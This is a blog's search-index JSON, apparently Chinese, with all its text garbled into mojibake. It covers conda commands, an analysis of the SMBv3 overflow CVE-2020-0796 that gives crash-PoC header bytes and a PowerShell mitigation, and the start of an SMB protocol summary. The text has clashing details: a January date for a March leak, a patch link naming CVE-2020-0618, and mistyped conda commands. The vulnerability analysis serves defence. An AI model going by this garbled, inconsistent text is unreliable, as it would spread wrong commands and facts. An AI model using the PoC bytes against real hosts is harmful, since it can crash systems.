~/.continuum #åˆ é™¤å¯èƒ½å­˜åœ¨çš„éšè—æ–‡ä»¶ ``` ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:3:3","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"ä¸‰ã€æ–¹æ¡ˆä½¿ç”¨ ä¸åšä»»ä½•è®¾ç½®çš„å‰æä¸‹ï¼Œå®‰è£…å®Œanacondaåï¼Œä¼šè®¾ç½®ä¸ºè‡ªåŠ¨å¯åŠ¨anacondaç¯å¢ƒï¼Œé»˜è®¤ä¸ºbaseç¯å¢ƒã€‚å¯¹äºæ˜¯å¦è®¾ç½®è‡ªåŠ¨å¯åŠ¨anacondaç¯å¢ƒå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ›´æ”¹ï¼š # å–æ¶ˆè‡ªåŠ¨å¯åŠ¨ conda config auto_activate_base false # è®¾ç½®è‡ªåŠ¨å¯åŠ¨ conda condif auto_activate_base true anacondaå¸¸ç”¨çš„å‘½ä»¤ #æŸ¥çœ‹condaç‰ˆæœ¬ conda --version #æ›´æ–°condaç‰ˆæœ¬ conda update conda #æŸ¥çœ‹å®‰è£…äº†å“ªäº›ä¾èµ–åº“ conda list #åˆ›å»ºæ–°çš„pythonç¯å¢ƒ conda create --name myenv #åˆ›å»ºç‰¹å®špythonç‰ˆæœ¬çš„ç¯å¢ƒ conda create -n myenv python=3.7 #åˆ›å»ºæ–°ç¯å¢ƒå¹¶æŒ‡å®šåŒ…å«çš„åº“ conda create -n myenv scipy #åˆ›å»ºæ–°ç¯å¢ƒç—…æŒ‡å®šç‰¹å®šç‰ˆæœ¬çš„åº“ conda create -n myenv scipy=0.15.0 #å¤åˆ¶ç¯å¢ƒ conda create --name myclone --clone myenv #æŸ¥çœ‹æ˜¯ä¸æ˜¯å¤åˆ¶æˆåŠŸäº† conda info --envs #æ¿€æ´»ã€è¿›å…¥æŸä¸ªç¯å¢ƒ source activate myenv #é€€å‡ºç¯å¢ƒ source deactivate #åˆ é™¤ç¯å¢ƒ conda remove --name myenv --all #æŸ¥çœ‹å½“å‰çš„ç¯å¢ƒåˆ—è¡¨ conda info --envs conda env list #æŸ¥çœ‹æŸä¸ªç¯å¢ƒä¸‹å®‰è£…çš„åº“ conda list -n myenv #æŸ¥æ‰¾åŒ… conda search XXX #å®‰è£…åŒ… conda install XXX #æ›´æ–°åŒ… conda update XXX #åˆ é™¤åŒ… conda remove XXX #å®‰è£…åˆ°æŒ‡å®šç¯å¢ƒ conda install -n myenv XXX ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:4:0","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Misc"],"content":"å››ã€æ€»ç»“ Anacondaæ˜¯æˆ‘ç›®å‰ä¸ºæ­¢è§‰å¾—æœ€ç®€å•çš„Pythonç®¡ç†å®è·µæ–¹å¼ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘å¯¹å…¶ä»–çš„äº†è§£ä¸å¤Ÿæ·±å…¥ã€‚è¯è¯´å›æ¥ï¼Œé€‚åˆè‡ªå·±çš„æ‰æ˜¯æœ€å¥½çš„ï¼Œä½ è§‰å¾—å‘¢ï¼Ÿ ","date":"2020-02-24","objectID":"/2020/02/anaconda3/:5:0","tags":["Mac","Python"],"title":"Macä¸‹çš„å¤šç‰ˆæœ¬Pythonç®¡ç†å®è·µ","uri":"/2020/02/anaconda3/"},{"categories":["Vuln"],"content":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:0:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"å‰è¨€ åŒ—äº¬æ—¶é—´2020.03.11æ—¥ï¼Œäº’è”ç½‘ä¸­æ³„æ¼äº†å…³äºCVE-2020-0796çš„ç›¸å…³ä¿¡æ¯ã€‚åœ¨æ­¤å‰çš„å¾®è½¯3æœˆä»½ä¾‹è¡Œè¡¥ä¸æ—¥æ›´æ–°ä¸­ï¼Œæ— æ„ä¸­æ³„æ¼äº†è¯¥æ¼æ´çš„å­˜åœ¨ã€‚è¯¥æ¼æ´å½±å“ç»„ä»¶ä¸ºSMBv3ï¼Œåœ¨Windows 10 1903å’ŒWindows Server 1903ä¹‹åçš„ç‰ˆæœ¬ä¸­å­˜åœ¨ï¼Œå½±å“èŒƒå›´è¾ƒå¹¿ã€‚ç›®å‰å°šæœªå‘ç°å¯åˆ©ç”¨EXPï¼Œä½†å·²æœ‰crashçš„PoCï¼Œéœ€è¦ç§¯æåº”å¯¹ã€‚æ­¤å¤–ï¼Œè¯¥æ¼æ´å…·æœ‰è •è™«ä¼ æ’­ç‰¹æ€§ï¼Œå¯ä»¥è½»æ¾è¿›è¡Œè •è™«ä¼ æ’­ï¼Œéœ€è¦é«˜åº¦é‡è§†ã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:1:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"ä¸€ã€SMBv3ç»„ä»¶ä»‹ç» SMBï¼ŒæœåŠ¡å™¨æ¶ˆæ¯å—ï¼Œæ˜¯ä¸€ä¸ªç½‘ç»œé€šä¿¡åè®®ï¼Œç”¨äºæä¾›å…±äº«è®¿é—®åˆ°æ–‡ä»¶ã€æ‰“å°æœºå’Œä¸²è¡Œç«¯å£çš„èŠ‚ç‚¹ä¹‹é—´çš„ç½‘ç»œä¸Šã€‚å®ƒè¿˜æä¾›äº†ç»è¿‡èº«ä»½éªŒè¯çš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ã€‚SMBçš„å¤§å¤šæ•°ç”¨æ³•æ¶‰åŠè¿è¡ŒMicrosoft Windowsçš„è®¡ç®—æœºï¼Œåœ¨å¼•å…¥Active Directoryä¹‹å‰è¢«ç§°ä¸ºâ€œ Microsoft Windowsç½‘ç»œâ€ ã€‚ç›¸åº”çš„WindowsæœåŠ¡æ˜¯ç”¨äºæœåŠ¡å™¨ç»„ä»¶çš„LAN ManageræœåŠ¡å™¨å’Œç”¨äºå®¢æˆ·ç«¯ç»„ä»¶çš„LAN Managerå·¥ä½œç«™ã€‚ Windows 10å’ŒWindows Server 2016å¼•å…¥äº†SMB 3.1.1 ã€‚é™¤äº†åœ¨SMB3ä¸­æ·»åŠ çš„AES-128 CCMåŠ å¯†å¤–ï¼Œè¯¥ç‰ˆæœ¬è¿˜æ”¯æŒAES-128 GCMåŠ å¯†ï¼Œå¹¶ä½¿ç”¨SHA-512å“ˆå¸Œå®ç°é¢„è®¤è¯å®Œæ•´æ€§æ£€æŸ¥ã€‚å½“ä½¿ç”¨SMB 2.xå’Œæ›´é«˜ç‰ˆæœ¬è¿æ¥åˆ°å®¢æˆ·ç«¯æ—¶ï¼ŒSMB 3.1.1è¿˜æ·»åŠ äº†å¿…é¡»è¿›è¡Œçš„å®‰å…¨åå•†æ­¥éª¤ã€‚ åœ¨SMBv3ä¸­ï¼Œæœ‰ä¸€é¡¹æ•°æ®å‹ç¼©åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡SMBè¿›è¡Œå‹ç¼©æ•°æ®çš„ä¼ è¾“ã€‚æ­¤æ¬¡æ¼æ´è§¦å‘ç‚¹å°±ä½äºå‹ç¼©æ•°æ®çš„è¿‡ç¨‹ä¸­ã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:2:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"äºŒã€æ¼æ´ä¿¡æ¯å’Œæè¿° ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:3:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"1. æ¼æ´æ–‡ä»¶ æ¼æ´å­˜åœ¨äºsrv2.sysæ–‡ä»¶ä¸­ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:3:1","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"2. æ¼æ´å‡½æ•° è¯¥æ¼æ´æ¶‰åŠåˆ°äº†å¤šä¸ªå‡½æ•°ï¼š Srv2DecompressMessageAsync Srv2DecompressData Smb2GetHonorCompressionAlgOrder Smb2SelectCompressionAlgorithm Smb2ValidateCompressionCapabilities ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:3:2","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"1. åŸºç¡€æ•°æ®ç»“æ„ è¿™é‡Œä¸»è¦çœ‹ä¸€ä¸‹SMB2 COMPRESSION_TRANSFORM_HEADERç»“æ„ï¼š é¦–å…ˆï¼Œè¯´æ˜äº†ç»“æ„ä½¿ç”¨çš„åœºæ™¯ï¼šå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨åœ¨å‘é€å‹ç¼©æ¶ˆæ¯æ—¶ä½¿ç”¨SMB2 COMPRESSION_TRANSFORM_HEADERã€‚æ­¤å¯é€‰æ ‡å¤´ä»…å¯¹SMB 3.1.1 dialectæœ‰æ•ˆã€‚ å¯ä»¥é€šè¿‡ä»¥ä¸‹é“¾æ¥æŸ¥çœ‹SMB 3.1.1 dialect ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¿›è¡Œå‹ç¼©æ•°æ®ä¼ è¾“æ—¶ï¼Œåº•å±‚ä½¿ç”¨çš„æ˜¯SMB2çš„COMPRESSION_TRANSFORM_HEADERï¼Œä½†æ˜¯ä¼šæœ‰SMB 3.1.1 dialectçš„éªŒè¯ç‰¹å¾ã€‚ ç„¶åï¼Œå¯¹ä»¥ä¸Šå„å­—æ®µåšç®€è¦è¯´æ˜ï¼š å­—æ®µ å«ä¹‰ ProtocolId (4 bytes) åè®®æ ‡è¯†ç¬¦ã€‚è¯¥å€¼å¿…é¡»è®¾ç½®ä¸º0x424D53FCï¼Œä¹Ÿä»¥ç½‘ç»œé¡ºåºè¡¨ç¤ºä¸º0xFCï¼Œâ€œ Sâ€ï¼Œâ€œ Mâ€å’Œâ€œ Bâ€ã€‚ OriginalCompressedSegmentSize (4 bytes) æœªå‹ç¼©æ•°æ®æ®µçš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ CompressionAlgorithm (2 bytes) æ­¤å­—æ®µåŠ¡å¿…åŒ…å«CompressionAlgorithmså­—æ®µä¸­æŒ‡å®šçš„ç”¨äºå‹ç¼©SMB2æ¶ˆæ¯çš„ç®—æ³•ä¹‹ä¸€ï¼Œâ€œ NONEâ€é™¤å¤–ã€‚ Flags (2 bytes) å¿…é¡»ä¸º2ä¸ªç‰¹å®šå€¼ä¹‹ä¸€ Offset/Length (4 bytes) å¦‚æœåœ¨Flagså­—æ®µä¸­è®¾ç½®äº†SMB2_COMPRESSION_FLAG_CHAINEDï¼Œåˆ™è¯¥å­—æ®µå¿…é¡»è§£é‡Šä¸ºé•¿åº¦ï¼Œå‹ç¼©æœ‰æ•ˆpayloadçš„é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼›å¦åˆ™ï¼Œè¯¥å­—æ®µå¿…é¡»è§£é‡Šä¸ºåç§»ã€‚ ä»æ­¤ç»“æ„çš„æœ«å°¾åˆ°å‹ç¼©æ•°æ®æ®µå¼€å§‹çš„åç§»é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ CompressionAlgorithmså­—æ®µä¸­æŒ‡å®šçš„ç®—æ³•ï¼š Flagså­—æ®µå¯é€‰çš„å›ºå®šå€¼ï¼š äº†è§£äº†ä»¥ä¸Šæ•°æ®ç»“æ„ï¼Œå¯ä»¥æ–¹ä¾¿PoCæ„é€ å’Œè§‚å¯Ÿæµé‡ç‰¹å¾ã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:1","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"2. é™æ€åˆ†æ srv2.sysæ–‡ä»¶æ‹–å…¥IDAï¼Œå…ˆè§‚å¯Ÿå‡½æ•°å®ç°ï¼š SMBé¦–å…ˆè°ƒç”¨srv2!Srv2ReceiveHandlerå‡½æ•°æ¥æ”¶æ•°æ®åŒ…ï¼Œå¹¶æ ¹æ®ProtocolIdè®¾ç½®å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼š å¦‚æœåˆ¤æ–­æ•°æ®åŒ…ä¸­ä¸ºå‹ç¼©çš„æ•°æ®ï¼ˆProtocolID = 0xfc4d5342ï¼‰ï¼Œåˆ™è°ƒç”¨å¤„ç½®å‡½æ•°â€“Srv2DecompressMessageAsyncå‡½æ•°ã€‚ srv2!Srv2DecompressMessageAsyncå‡½æ•°ä¼šç»§ç»­è°ƒç”¨ Srv2DecompressDataå‡½æ•°ï¼š Srv2DecompressMessageAsyncå‡½æ•°å¹¶ä¸æ˜¯å®é™…å¤„ç†å‹ç¼©æ•°æ®çš„å‡½æ•°ï¼Œè€Œæ˜¯ç»§ç»­è°ƒç”¨äº†Srv2DecompressDataå‡½æ•°ï¼Œè·Ÿè¿›æŸ¥çœ‹Srv2DecompressDataå‡½æ•°ï¼š åœ¨Srv2DecompressDataå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°æ•°æ®å¤„ç†çš„éƒ¨åˆ†ï¼šåœ¨è¿›è¡Œbufferåˆ†é…æ—¶ï¼Œä¼šè°ƒç”¨ SrvNetAllocateBufferè¿›è¡Œåˆ†é…ã€‚ä½†æ˜¯åœ¨è°ƒç”¨æ—¶ï¼Œå¹¶æœªå¯¹OriginalCompressedSegmentSizeå’ŒOffset/Lengthçš„é•¿åº¦è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œå¯¹äºŒè€…ç›¸åŠ çš„å’Œä¹Ÿæœªè¿›è¡Œå®‰å…¨æ£€æŸ¥ã€‚æ­¤å¤„å°±å­˜åœ¨ä¸€ä¸ªæ•´æ•°æº¢å‡ºï¼Œå¦‚æœäºŒè€…çš„å’Œä¸ºä¸€ä¸ªç‰¹åˆ«å¤§çš„å€¼ï¼Œä¼šè¶…å‡ºå†…å­˜å­˜å‚¨èŒƒå›´ï¼Œå€¼ä¼šå˜æˆä¸€ä¸ªå¾ˆå°çš„å€¼ã€‚ srv2!Srv2DecompressDataå‡½æ•°è°ƒç”¨SmbCompressionDecompresså‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨nt!RtlDecompressBufferXpressLzå‡½æ•°è¿›è¡Œå®é™…çš„æ•°æ®è§£å‹è¿‡ç¨‹ã€‚nt!RtlDecompressBufferXpressLzå‡½æ•°ä½äºntoskrnl.exeä¸­ï¼Œè¯¥å‡½æ•°å®é™…è¿›è¡Œçš„å¤„ç†å°±æ˜¯ï¼š ç”±ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°åœ¨è¿›è¡Œæ•°æ®è§£å‹ç¼©æ—¶ï¼Œé¦–å…ˆè¿›è¡Œsmb compressåè®®æ•°æ®åŒ…çš„è§£æï¼Œè·å–å…¶ä¸­åŒ…å«çš„éœ€è¦è§£å‹ç¼©çš„æ•°æ®çš„å¤§å°ï¼Œå¹¶å’Œä¹‹å‰é€šè¿‡SrvNetAllocateBufferåˆ†é…çš„bufferçš„OriginalCompressedSegmentSizeå€¼è¿›è¡Œæ¯”è¾ƒï¼Œç¡®è®¤å…¶å¤§å°ä¸å¤§äºOriginalCompressedSegmentSizeï¼Œç„¶åè¿›è¡Œå†…å­˜æ‹·è´ã€‚è‹¥v21å¤§äºOriginalCompressedSegmentSizeï¼Œåˆ™è¿”å›0xC0000242é”™è¯¯ã€‚å› ä¸ºåœ¨2ä¸­è¿›è¡Œå†…å­˜åˆ†é…æ—¶æ²¡æœ‰åšé•¿åº¦æ£€æŸ¥ï¼Œæ‰€ä»¥å¦‚æœä¼ å…¥ä¸€ä¸ªå¾ˆå¤§çš„OriginalCompressedSegmentSizeå€¼è§¦å‘æ•´æ•°æº¢å‡ºï¼Œæ­¤æ—¶v21å°±å¯ä»¥è®¾ç½®ä¸€ä¸ªæå¤§å€¼ï¼Œä½†å¯ä»¥é€šè¿‡å¯¹decompress sizeçš„åˆ¤æ–­ï¼Œæœ€ç»ˆè°ƒç”¨qmemcpyæ‹·è´ä¸€ä¸ªæå¤§çš„sizeå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:2","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"3. crashçš„PoCå¤ç° é¦–å…ˆæ˜¯é¶æœºåªæ˜¯å¼€æœºï¼Œæœªç™»å½•çš„çŠ¶æ€ï¼š ç›´æ¥æ‰§è¡ŒPoCï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œï¼š æ­£å¸¸ç™»å½•åçš„æ‰§è¡Œï¼Œåªæ˜¯æ­£å¸¸ç™»å½•ï¼Œå¹¶æœªè¿›è¡Œä»»ä½•æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„å…±äº«è®¾ç½®ï¼š åŒæ ·å¯ä»¥é€ æˆè“å±ï¼š æ‰€ä»¥ï¼Œä¸ç®¡å­˜åœ¨æ¼æ´çš„ç³»ç»Ÿæ˜¯å¦ç™»å½•ã€æ˜¯å¦å¼€å¯äº†å…±äº«ï¼Œéƒ½å¯ä»¥æ­£å¸¸æ‰§è¡ŒPoCã€‚è”æƒ³åˆ°EXPï¼Œåªè¦å¯ä»¥è·å–åˆ°å—å½±å“ç³»ç»Ÿçš„IPåœ°å€ï¼Œå³å¯è¿›è¡Œæ¼æ´æ”»å‡»ã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:3","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"4. PoCä»£ç åˆ†æ è€ƒè™‘åˆ°PoCå°šæœªå¤§èŒƒå›´ä¼ æ’­ï¼Œæ­¤å¤„ä¸æ”¾å‡ºå®Œæ•´ä»£ç ï¼Œåªå¯¹å…³é”®ä»£ç è¿›è¡Œè§£é‡Šï¼š // è®¾ç½®å¤´éƒ¨ \\xfc\\x53\\x4d\\x42 // è®¾ç½®OriginalCompressedSegmentSizeå­—æ®µï¼Œæ­¤å€¼ä¸ºå¤šå°‘ï¼Œåç»­å°±è¦è·Ÿå¤šå°‘å¡«å……æ•°æ® \\x32\\x00\\x00\\x00 // è®¾ç½®CompressionAlgorithmå­—æ®µï¼Œç¡®å®šä½¿ç”¨çš„å‹ç¼©ç®—æ³• \\x01\\x00 // è®¾ç½®Flagså­—æ®µ \\x00\\x00 // è®¾ç½®Offset/Lengthå­—æ®µ \\xff\\xff\\xff\\xff å…¶ä¸­ä¸»è¦çš„æ˜¯è¦OriginalCompressedSegmentSize + Offset/Length å¯ä»¥äº§ç”Ÿæº¢å‡ºï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå­—æ®µçš„å€¼å¯ä»¥æ›´æ”¹ï¼Œæœ€ç»ˆä½¿ç”¨çš„æ˜¯ä¸¤ä¸ªå­—æ®µçš„å’Œã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:4","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"5. æ›´æ–°åçš„srv2.sysæ–‡ä»¶ ä¸»è¦æ˜¯å¯¹Srv2DecompressDataå‡½æ•°è¿›è¡Œäº†æ›´æ–°ï¼Œæ·»åŠ äº†ä¸€äº›æ•°æ®é•¿åº¦çš„æ£€æŸ¥ã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:5","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"6. æµé‡åˆ†æ ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„PoCé€ æˆçš„è“å±çš„æµé‡æˆªå›¾å¦‚ä¸‹ï¼š è®¾ç½®Offset/Lengthå­—æ®µä¸ºffffffff è®¾ç½®OriginalCompressedSegmentSizeå­—æ®µä¸ºffffffffï¼š ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:6","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"7. æ¼æ´é˜²å¾¡ç­–ç•¥ ç†Ÿæ‚‰äº†æ¼æ´åŸç†åï¼Œå¯ä»¥åœ¨æµé‡æµ‹è¿›è¡Œé˜²å¾¡ï¼Œæ¯”å¦‚ä½¿ç”¨Snortçš„byte_mathå…³é”®å­—åˆ¤æ–­ä¸¤ä¸ªå­—æ®µçš„å’Œæ˜¯å¦ä¼šå‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå‘ç”Ÿäº†è¯æ˜å¯èƒ½å­˜åœ¨æ¶æ„æµé‡ã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:7","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"å››ã€ç¼“è§£æªæ–½åŠå®‰å…¨æ›´æ–° ç¼“è§£æªæ–½ï¼šä½¿ç”¨ä»¥ä¸‹PowerShellå‘½ä»¤ç¦ç”¨SMBv3å‹ç¼©åŠŸèƒ½ Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 1 -Force ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è§£ç¦ç”¨SMBv3å‹ç¼©åŠŸèƒ½ Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 0 -Force è€ƒè™‘åˆ°è¯¥æ¼æ´å½±å“è¾ƒå¹¿ï¼Œä¸”crashçš„PoCå·²ç»å…¬å¼€ï¼Œå¼ºçƒˆå»ºè®®åŠæ—¶å®‰è£…å®˜æ–¹å®‰å…¨è¡¥ä¸ï¼Œè¡¥ä¸é“¾æ¥å¦‚ä¸‹ï¼š https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:5:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"äº”ã€å¤‡æ³¨ ç½‘ä¸Šçœ‹åˆ°ä¸€äº›å¤§ä½¬çš„åˆ†æï¼Œå®šä½åˆ°äº†å‹ç¼©ç®—æ³•é‡Œçš„æ¼æ´ï¼Œæœ¬äººèƒ½åŠ›æœ‰é™ï¼Œå¯èƒ½æ²¡æœ‰åˆ†æè¶³å¤Ÿé€å½»ï¼Œæœ›åŒ…æ¶µã€‚ ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:6:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"å…­ã€å‚è€ƒé“¾æ¥ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0#Appendix_A_Target_69 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/78e0c942-ab41-472b-b117-4a95ebe88271 http://blogs.360.cn/post/CVE-2020-0796.html https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:7:0","tags":["æ¼æ´"],"title":"å¾®è½¯SMBv3 Client/Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆCVE-2020-0796ï¼‰","uri":"/2020/01/cve-2020-0796/"},{"categories":["Windows"],"content":"SMB åè®®ç®€å•æ€»ç»“","date":"2019-12-24","objectID":"/2019/12/smb/","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"SMBåè®®ç®€å•æ€»ç»“ ","date":"2019-12-24","objectID":"/2019/12/smb/:0:0","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"SMBåè®® ","date":"2019-12-24","objectID":"/2019/12/smb/:1:0","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"ä¸€. Clientå’ŒServerçš„è¿æ¥è¿‡ç¨‹ clientå’Œserveré¦–å…ˆå»ºç«‹NetBIOS session clentå’Œserverç¡®å®šä½¿ç”¨çš„smbåè®®çš„dialectï¼ˆå®šä¹‰äº†ç‰¹å®šåè®®ç‰ˆæœ¬çš„æ¶ˆæ¯åŒ…é›†ï¼‰ clientç™»å½•åˆ°server clientè¿æ¥serverä¸Šçš„ä¸€ä¸ªshare clientåœ¨shareä¸­æ‰“å¼€æ–‡ä»¶ clientå¼€å§‹è¯»å–æ–‡ä»¶ clientå’Œserveré¦–å…ˆè¦å»ºç«‹å…¨åŒå·¥çš„TCPè¿æ¥ï¼Œç„¶åclientå»ºç«‹å¹¶å‘é€ä¸€ä¸ªNetBIOS sessionè¯·æ±‚åŒ…ã€‚ å¦‚æœè¯·æ±‚åŒ…æ ¼å¼åŒ–æ­£ç¡®ï¼Œserverè¿”å›ä¸€ä¸ªåŒ…å«ç€ç¡®è®¤sessionå»ºç«‹æˆåŠŸçš„æ¶ˆæ¯åŒ…ã€‚ç„¶åï¼Œclient å¼€å§‹æƒ³serverå‘é€ç¬¬ä¸€ä¸ªsmbåè®®æ•°æ®åŒ…ã€‚ ","date":"2019-12-24","objectID":"/2019/12/smb/:1:1","tags":["SMB"],"title":"SMB åè®®ç®€å•æ€»ç»“","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"äºŒ. 